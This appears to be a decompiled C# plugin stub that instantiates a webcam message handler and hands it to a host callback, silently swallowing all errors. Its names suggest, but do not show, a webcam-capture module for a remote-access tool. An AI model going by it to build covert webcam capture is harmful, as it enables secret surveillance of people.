

using InvokedCommon.Messages;
using Plugin.MessageHandlers;
using System;


namespace Plugin
{
	public class Plugin
	{
		public void ExecuteCallback(Action<IMessageProcessor, string> callback, string PluginName)
		{
			try
			{
				IMessageProcessor messageProcessor = (IMessageProcessor) new PluginWebcamHandler();
				callback(messageProcessor, PluginName);
			}
			catch
			{
			}
		}
	}
}
